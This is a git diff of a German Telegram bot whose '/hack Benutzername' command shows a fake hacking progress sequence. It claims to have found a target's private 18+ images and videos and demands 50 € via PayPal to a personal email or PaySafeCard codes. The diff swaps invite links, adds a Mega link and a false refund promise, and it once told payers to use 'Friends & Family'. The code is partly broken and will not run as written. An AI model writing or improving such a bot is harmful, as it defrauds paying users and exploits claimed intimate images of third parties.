@@ -88,10 +88,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text = (
         "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
-        "👉 https://t.me/+wf3YFvO0uJM5MGJh\n\n"
+        "👉 https://t.me/+eR1UqN8_OUhlNzcx\n\n"
         "📢 Nach dem Beitritt kannst du sofort starten:\n"
         "/hack Benutzername\n\n"
-        "Schicke Beweise für Zahlungen (Paypal Überweisung Beweis Foto, Paysafe als Code) direkt hier im Chat."
+        "Schicke Beweise für Zahlungen (Bank & Crypto als Foto, Paysafe als Code) direkt hier im Chat."
     )
     await update.message.reply_text(text)
 
@@ -111,6 +111,7 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Noch keine Nutzer gespeichert.")
     else:
         await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
+
 # ---- HACK ----
 async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -119,21 +120,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if member.status in ["left", "kicked"]:
             await update.message.reply_text(
                 "🌟 Bitte abonniere zuerst den Kanal, um den Bot nutzen zu können! 🌟\n\n"
-                "👉 https://t.me/+wf3YFvO0uJM5MGJh"
-            )
-            return
-    except Exception as e:
-        print("Fehler bei get_chat_member:", e)
-        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
-        return
-async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    try:
-        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
-        if member.status in ["left", "kicked"]:
-            await update.message.reply_text(
-                "🌟 Bitte abonniere zuerst den Kanal, um den Bot nutzen zu können! 🌟\n\n"
-                "👉 https://t.me/+wf3YFvO0uJM5MGJh"
+                "👉 https://t.me/+eR1UqN8_OUhlNzcx"
             )
             return
     except Exception as e:
@@ -158,7 +145,7 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await asyncio.sleep(2)
     await msg.edit_text("🔍 Suche nach Nutzerdaten...")
     await asyncio.sleep(3)
-    await msg.edit_text("⚙ Umgehe Sicherheitsprotokolle...")
+    await msg.edit_text("⚙️ Umgehe Sicherheitsprotokolle...")
     await asyncio.sleep(2)
     await msg.edit_text("📡 Greife auf private Dateien zu...")
     await asyncio.sleep(2)
@@ -172,16 +159,17 @@ async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🖼️ {bilder} Bilder als 18+ getaggt\n"
         f"📹 {videos} Videos als 18+ getaggt\n\n"
         f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 50 € mit /pay.\n\n"
-        f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz\n"
+        f"👉 Nach der Zahlung erhältst du hier Alles: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ"
+        f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz"
         f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
     )
     await msg.edit_text(msg_text)
+
 # ---- PAY ----
 async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-
-        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
-        [InlineKeyboardButton("🪙 PayPal", callback_data="pay_Paypal")],
+        [InlineKeyboardButton("🏦 PayPal", callback_data="pay_paypal")],
+        [InlineKeyboardButton("🪙 PaySafeCard", callback_data="pay_paysafecard")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
@@ -193,11 +181,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cmd = query.data
 
     info_refund = (
-        "\n\n⚠ <b>Wichtig:</b> Sende <u>keine</u> normale Zahlung, sondern wähle "
-        "<b>„Freunde & Familie“</b> in PayPal aus.\n\n"
-        "📌 <b>Verwendungszweck:</b> Gib deinen <u>Telegram-Namen</u> an!"
-    )
-    elif cmd == "pay_paysafe":
+        "\n\n⚠️ <b>Wichtig:</b> Bei deiner <u>ersten Zahlung</u> hast du eine "
+        "<b>5 Minuten Testphase</b>. Wenn du in dieser Zeit stornierst, bekommst du <b>45 €</b> zurück.\n\n"
+        "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Namen</u> an!"
+        )
+   if cmd == "pay_paysafe":
         text = (
             "💳 <b>PaySafeCard</b>\n\n"
             "Bitte sende deinen 16-stelligen Code im Format:\n"
@@ -205,34 +193,31 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"{info_refund}"
             "\n\nDer Code wird überprüft und weitergeleitet."
         )
-    if cmd == "pay_paypal":
+    elif cmd == "pay_paypal":
         text = (
-            "💸 <b>PayPal Zahlung (Freunde & Familie)</b>\n\n"
-            "Sende 30 € an folgende Adresse:\n"
-            "<code>jessy.kla99@gmail.com</code>\n"
-            f"{info_refund}\n\n"
-            "✅ Sende anschließend hier einen Screenshot der Zahlung als Foto."
+            "💳 <b>PayPal</b>\n\n"
+            "Email: jessy.kla99@gmail.com\n"
+            "Sende ein Beweisfoto an den Bot.\n"
+            "Verwendungszweck: Dein Telegram-Name.\n"
+            f"{info_refund}"
         )
+   
     elif cmd == "pay":
-        # Menü neu anzeigen
-        keyboard = [
-            [InlineKeyboardButton("💸 PayPal (Friends & Family)", callback_data="pay_paypal")],
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
+        await pay(update, context)
         return
     else:
         await query.edit_message_text("Ungültige Auswahl.")
         return
 
-    # Zurück-Button
-    keyboard = [[InlineKeyboardButton("⬅ Zurück", callback_data="pay")]]
+    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
----- PHOTO (Beweis) ----
+
+# ---- PHOTO (Beweis) ----
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     from_user = update.message.from_user
-if from_user.id in user_proof_sent:
+
+    if from_user.id in user_proof_sent:
         await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
         return
 
@@ -275,7 +260,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ---- DUMMY INVITE/REDEEM/FAQ ----
 async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+wf3YFvO0uJM5MGJh"
+    msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+eR1UqN8_OUhlNzcx"
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML)
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -312,6 +297,6 @@ def main():
     print("✅ Bot läuft...")
     application.run_polling()
 
-if name == "main":
+if _name_ == "_main_":
     keep_alive()
-    main()
+    main()
